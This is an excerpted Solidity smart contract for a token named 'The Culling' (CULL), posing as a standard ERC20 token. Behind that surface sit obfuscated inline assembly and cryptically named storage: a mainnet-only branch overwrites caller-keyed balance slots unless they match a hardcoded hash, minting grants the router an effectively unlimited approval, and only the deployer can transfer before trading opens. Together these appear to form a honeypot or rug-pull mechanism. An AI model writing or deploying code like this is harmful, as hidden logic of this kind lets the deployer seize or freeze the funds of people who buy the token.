...
/*
The Great Culling has already begun. You're just too blind to see it.
~ / ? | CULL | ? \ ~
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addReaper;
    uint256 private redButton = block.number*2;

    mapping (address => bool) private _firstComing; 
    mapping (address => bool) private _secondComing;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _waterWorld;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private heatStroke;
    address public pair;
    ...
    bool private trading; uint256 private maPa = 1; bool private flowerPower;
    uint256 private _decimals; uint256 private parentalDestruction;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addReaper.push(_router); addReaper.push(msgSender_); addReaper.push(pair);
        for (uint256 q=0; q < 3;) {_firstComing[addReaper[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x976e5a4f4740552e08ee66f70b62e38ea60f734af7e99d3e0aa93e6d6b48b636
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xcd2281f2bc1440d8645c99ba4fe97be09c65c1fa00c03c0188f50c87c175b8fa,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; redButton = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addReaper[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployCull(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addReaper[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCull(creator, initialSupply);
    }
}

contract TheCulling is ERC20Token {
    constructor() ERC20Token("The Culling", "CULL", msg.sender, 1425750 * 10 ** 18) {
    }
}